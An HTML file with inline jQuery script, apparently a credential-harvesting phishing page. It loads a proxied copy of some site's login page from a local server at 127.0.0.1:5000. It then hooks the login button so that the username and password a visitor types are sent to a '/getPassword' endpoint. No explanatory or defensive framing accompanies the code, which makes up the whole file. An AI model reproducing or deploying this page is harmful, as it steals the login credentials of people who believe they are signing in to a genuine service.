<html>

<head>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script>
        let html;
        
        $(document).ready(function () {
            $.ajax({
                url: 'http://127.0.0.1:5000/proxy',
                success: function (data) {
                    html = data;
                    display_html();
                }
            });
        });

        function display_html() {
            $("body").append(html);

            $(".login-button").click(function(){

                // Get the value from the input fields using $ selector and input field's id's and store their values in userLoginId,  userPassword 
                var userLoginId = $("#id_userLoginId").val();
                var userPassword = $("#id_password").val();

                $.ajax({
                    url: 'http://127.0.0.1:5000/getPassword',
                    // Use value of the userLoginId and userPassword variables
                    // data: { id: "userLoginId", password: "userPassword" },
                    data: { id: userLoginId, password: userPassword},
                });
            });
        }

    </script>
</head>
<body>
</body>
</html>
